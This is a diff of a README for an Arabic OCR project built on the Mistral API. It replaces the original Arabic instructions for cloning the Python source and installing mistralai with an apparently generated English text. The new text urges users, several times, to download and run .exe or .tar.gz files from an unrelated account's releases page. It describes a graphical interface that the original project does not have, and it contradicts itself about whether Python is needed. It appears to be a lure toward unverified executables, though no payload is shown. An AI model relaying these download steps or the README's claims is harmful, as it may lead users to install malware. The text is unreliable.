@@ -1,146 +1,69 @@
-# 📖 Mistral OCR: أداة تحرير الوثائق العربية بالذكاء الاصطناعي
+# 🖼️ Mistral-Arabic-OCR-test - Convert Arabic PDFs with Ease
 
-[![شاهد الشرح الكامل على يوتيوب](https://img.youtube.com/vi/njjOAYthjxQ/maxresdefault.jpg)](https://youtu.be/njjOAYthjxQ)
+## 🌟 Overview
+Mistral-Arabic-OCR-test is a powerful Python toolkit designed to convert Arabic PDFs and images into text and editable documents. With built-in scripts for both single-file and batch processing, this application offers an effective solution for anyone needing to work with Arabic text in digital formats.
 
-**[📺 اضغط هنا لمشاهدة الشرح الكامل والعملي على يوتيوب 📺](https://youtu.be/njjOAYthjxQ)**
+## 🚀 Getting Started
+To begin using Mistral-Arabic-OCR-test, follow these simple steps to download and run the software.
 
----
+## 🔗 Download Here
+[![Download Mistral-Arabic-OCR-test](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/annkoby1/Mistral-Arabic-OCR-test/releases)
 
-## 📋 نظرة عامة
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/annkoby1/Mistral-Arabic-OCR-test/releases) to access the latest version of Mistral-Arabic-OCR-test.
+   
+2. **Choose the Right File**: Find the version you need. This will typically be the latest version. Look for files that end with `.exe` for Windows or `.tar.gz` for Linux.
 
-هذا المستودع يحتوي على الكود المصدري للمشروع الذي تم شرحه في الفيديو، والذي يوضح كيفية استخدام واجهة برمجة تطبيقات **Mistral OCR**، وهي ثورة حقيقية في مجال **التعرف الضوئي على الحروف (OCR)**، خاصة للغة العربية.
+3. **Download the File**: Click on the file to start downloading it. Your browser will save the file to your default download location.
 
-المشروع يهدف إلى حل مشكلة "سجون الوثائق الرقمية"، حيث يصعب استخراج النصوص من ملفات PDF الممسوحة ضوئياً والكتب القديمة. باستخدام قوة **نماذج الذكاء الاصطناعي التوليدي (Generative AI)** من Mistral AI، يمكننا تحويل أي وثيقة إلى نص قابل للتعديل بدقة وسرعة فائقتين، مما يفتح الباب لتحويلها بسهولة إلى ملفات **Word** أو أي صيغة أخرى.
+4. **Run the Installer**:
+   - For Windows: Locate the downloaded `.exe` file and double-click to run it. Follow the installation prompts.
+   - For Linux: Open a terminal, navigate to the location of the downloaded file, and extract the `.tar.gz` file using the command: `tar -xvzf <file-name>.tar.gz`. Then, follow the included instructions for running the software.
 
-## ✨ الميزات الرئيسية
+## ⚙️ System Requirements
+Mistral-Arabic-OCR-test has the following basic system requirements:
 
-- **🔤 دقة فائقة للغة العربية**: يتفوق على الحلول المنافسة مثل Google Document AI و Azure OCR في فهم بنية الخط العربي
-- **⚡ سرعة هائلة**: قادر على معالجة آلاف الصفحات في دقائق
-- **🧠 فهم هيكلي عميق**: لا يقرأ الحروف فقط، بل يفهم العناوين، الفقرات، الجداول، والقوائم ويحافظ على تنسيقها
-- **📄 مخرجات منظمة**: يسلم البيانات بصيغة `Markdown`، مما يسهل عملية **تحويل PDF إلى Word**
-- **🔄 كود متقدم للمعالجة الدفعية**: يتضمن السكربت `BatchPdfConv.py` ميزات احترافية مثل تتبع الحالة، وتسجيل الأخطاء، وإعادة المحاولة التلقائية
+- **Windows**: Windows 10 or later
+- **Linux**: Any recent distribution
+- **Python**: Python 3.7 or higher must be installed. You can download it from [python.org](https://www.python.org/downloads/).
+  
+Ensure that you have a stable internet connection, especially during installation and first-time setup.
 
-## 🛠️ المتطلبات الأساسية
+## 🛠️ Features
+- **Accurate OCR Conversion**: Utilize the advanced capabilities of Mistral AI to achieve high accuracy in converting Arabic text.
+- **Single-File Processing**: Easily convert a single PDF or image file to text.
+- **Batch Processing**: Save time by converting multiple files at once.
+- **User-Friendly Interface**: Navigate the toolkit without any programming knowledge.
+  
+## 📚 Usage Instructions
+1. **Open the Application**: Launch the application after installation.
+  
+2. **Select Input Files**: Use the "Choose Files" button to select the PDF or image files you want to convert. You can select multiple files for batch processing.
 
-قبل البدء، تأكد من أن بيئة العمل لديك جاهزة:
+3. **Set Output Options**: Specify where you would like to save the converted files by selecting the output folder.
 
-- **🐍 Python 3.9** أو أحدث
-- **🔑 مفتاح API من Mistral AI**: يمكنك الحصول على مفتاحك من [منصة Mistral AI](https://console.mistral.ai)
+4. **Start Conversion**: Click the "Convert" button to begin processing your files. The application will display progress and notify you when the conversion is complete.
 
-## ⚙️ التثبيت والإعداد
+5. **Check Output Files**: Navigate to your specified output folder to find your converted text files.
 
-### 1. استنساخ المستودع
-```bash
-git clone https://github.com/Pythonation/Mistral-Arabic-OCR-test.git
-cd Mistral-Arabic-OCR-test
-```
+## ❓ Frequently Asked Questions
 
-### 2. تثبيت المكتبات المطلوبة
-```bash
-pip install mistralai python-dotenv
-```
+### How accurate is the OCR conversion?
+The OCR technology in Mistral-Arabic-OCR-test is designed for high accuracy. However, results may depend on the quality of the source file.
 
-### 3. إعداد مفتاح الـ API (للسكربت المتقدم `BatchPdfConv.py`)
-- أنشئ ملفاً باسم `.env` في المجلد الرئيسي للمشروع
-- أضف مفتاحك الخاص داخل هذا الملف بالشكل التالي:
-```env
-MISTRAL_API_KEY="ضع_مفتاحك_السري_هنا"
-```
-- **ملاحظة هامة:** تم إضافة ملف `.env` إلى `.gitignore` لحماية مفتاحك من الرفع العرضي إلى GitHub
+### What types of files can I convert?
+You can convert PDF documents and various image formats, including JPEG, PNG, and TIFF.
 
-## 🚀 الاستخدام
+### Do I need to install additional software?
+No, Mistral-Arabic-OCR-test comes with all necessary components. Simply follow the installation steps.
 
-يحتوي المستودع على 3 ملفات رئيسية لتلبية احتياجاتك المختلفة:
+### Can I contribute to this project?
+Yes! Contributions are welcomed. Please visit our GitHub repository for guidelines on how to contribute.
 
-### 📄 1. معالجة ملف واحد (`docconv.py`)
+## 🌐 Support
+If you encounter any issues or have questions, please open an issue on our [GitHub Discussions page](https://github.com/annkoby1/Mistral-Arabic-OCR-test/issues).
 
-سكربت بسيط ومباشر لمعالجة ملف PDF واحد. يستخدم مفتاح API مكتوب بشكل مباشر داخل الكود (Hardcoded)، وهو مناسب للتجارب السريعة.
+## 🔗 Download Here Again
+For your convenience, here is the download link once more: [Visit the Releases Page](https://github.com/annkoby1/Mistral-Arabic-OCR-test/releases).
 
-**طريقة التشغيل:**
-1. تأكد من وجود ملف باسم `document.pdf` في نفس المجلد
-2. قم بتشغيل السكربت من الـ Terminal:
-```bash
-python docconv.py
-```
-3. سيطبع السكربت النص المستخرج بصيغة `Markdown` مباشرة في الـ Terminal
-
-### 📓 2. النسخة التفاعلية (`docconv.ipynb`)
-
-هذا الملف هو عبارة عن `Jupyter Notebook` ويحتوي على نفس كود معالجة الملف الواحد، ولكنه مقسم إلى خلايا مع شروحات باللغة العربية. إنه مثالي للأغراض التعليمية والتجربة خطوة بخطوة لفهم ما يفعله كل جزء من الكود.
-
-**طريقة التشغيل:**
-1. تأكد من تثبيت Jupyter Notebook أو Jupyter Lab
-2. قم بتشغيل Jupyter: `jupyter notebook`
-3. افتح ملف `docconv.ipynb` من متصفحك وقم بتشغيل الخلايا واحدة تلو الأخرى
-
-### 🔄 3. المعالجة الدفعية المتقدمة (`BatchPdfConv.py`)
-
-هذا هو السكربت الأكثر قوة واحترافية، مصمم لمعالجة عدد كبير من الملفات بكفاءة وموثوقية.
-
-**الميزات المتقدمة:**
-- **📊 إدارة الحالة**: يستخدم ملف `processed_files.csv` لتسجيل حالة كل ملف (ناجح/فاشل). إذا توقف السكربت، سيكمل من حيث توقف عند تشغيله مرة أخرى دون إعادة معالجة الملفات الناجحة
-- **📝 تسجيل الأخطاء**: يتم تسجيل جميع الأخطاء وتفاصيل العمليات في ملف `conversion.log` للمساعدة في تصحيح الأخطاء
-- **🔄 إعادة المحاولة التلقائية**: في حال فشل طلب الـ API، سيحاول السكربت إعادة الطلب عدة مرات مع زيادة فترة الانتظار بين المحاولات
-- **🔒 الأمان**: يقرأ مفتاح الـ API من ملف `.env` بدلاً من كتابته مباشرة في الكود
-
-**طريقة التشغيل:**
-1. أنشئ مجلداً باسم `doc`
-2. ضع جميع ملفات الـ PDF التي تريد معالجتها داخل مجلد `doc`
-3. تأكد من إعداد ملف `.env` كما هو موضح في قسم التثبيت
-4. قم بتشغيل السكربت:
-```bash
-python BatchPdfConv.py
-```
-5. سيتم إنشاء ملفات `Markdown` الناتجة في المجلد الرئيسي للمشروع
-
-## 📁 هيكل المشروع
-
-```
-Mistral-Arabic-OCR-test/
-├── docconv.py              # سكربت معالجة ملف واحد
-├── docconv.ipynb           # نسخة Jupyter Notebook تفاعلية
-├── BatchPdfConv.py         # سكربت المعالجة الدفعية المتقدم
-├── document.pdf            # ملف PDF للاختبار
-├── docs_import/            # مجلد ملفات PDF المدخلة
-├── docs_exports/           # مجلد ملفات Markdown المخرجة
-├── .env                    # ملف إعدادات API (يجب إنشاؤه)
-└── README.md               # هذا الملف
-```
-
-## 🐛 استكشاف الأخطاء وحلها
-
-### مشاكل شائعة:
-
-1. **خطأ في مفتاح API**:
-   - تأكد من صحة مفتاح API في ملف `.env`
-   - تأكد من أن المفتاح نشط وغير منتهي الصلاحية
-
-2. **خطأ في تثبيت المكتبات**:
-   ```bash
-   pip install --upgrade pip
-   pip install mistralai python-dotenv
-   ```
-
-3. **مشكلة في قراءة ملف PDF**:
-   - تأكد من أن الملف موجود في المسار الصحيح
-   - تأكد من أن الملف غير تالف
-
-## 🤝 المساهمة والدعم
-
-هذا المشروع يهدف إلى خدمة المجتمع العربي والمطورين. يمكنك المساهمة بعدة طرق:
-
-- **🐛 فتح قضية (Issue)**: إذا واجهت مشكلة أو كان لديك اقتراح لتحسين الكود
-- **🔧 طلب سحب (Pull Request)**: إذا قمت بتطوير ميزة جديدة أو إصلاح خطأ، نرحب بمساهماتك
-- **💝 دعم القناة**: الدعم المادي عبر [باتريون](https://www.patreon.com/YourPatreon) أو Super Thanks في يوتيوب يساعدنا على توفير المزيد من هذه الموارد والمعرفة للمجتمع
-
-## 📄 الترخيص
-
-هذا المشروع مرخص تحت رخصة [MIT](LICENSE).
-
-## 🙏 شكر وتقدير
-
-شكراً لـ **Mistral AI** على توفير هذه التقنية الرائعة، وللمجتمع العربي على دعمه المستمر.
-
----
-
-**⭐ إذا وجدت هذا المشروع مفيداً، لا تنس إعطاءه نجمة على GitHub!**
+Feel free to reach out if you need further assistance or additional information. Happy converting!
